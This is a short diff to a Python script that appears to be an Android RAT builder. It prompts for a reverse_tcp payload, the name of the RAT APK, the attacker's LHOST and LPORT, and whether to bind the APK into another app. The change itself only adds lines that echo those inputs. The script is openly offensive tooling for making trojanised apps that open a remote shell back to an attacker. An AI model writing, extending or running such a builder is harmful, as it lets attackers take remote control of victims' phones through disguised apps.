@@ -31,10 +31,15 @@ print("""\033[1;36m
 **********************************************************************|
 """)
 payload=click.prompt("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE (default reverse_tcp): ", type=int, default=1)
+print(f"PAYLOAD ==> {payload}") 
 output=click.prompt("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[default /root/]: ", type=str, default="/root")
+print(f"OUTPUT PATH ==> {output}")
 name=click.prompt("ENTER THE NAME OF YOUR RAT APK(example: rat.apk)( '.apk' extension is must)[default febrev.apk]: ", type=str, default="febrev.apk"  )
+print(f"NAME ==> {name}")
 lhost=click.prompt("ENTER YOUR IP ADDRESS(lhost) : ", type=str, default=socket.gethostbyname(socket.gethostname()))
+print(f"LHOST ==> {lhost}")
 lport=click.prompt("ENTER YOUR LISTENER PORT(lport)[default 6595] : ", type=str, default="6595")
+print(f"LPORT ==> {lport}")
 def venom():
     if payload==1:
         bind=input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
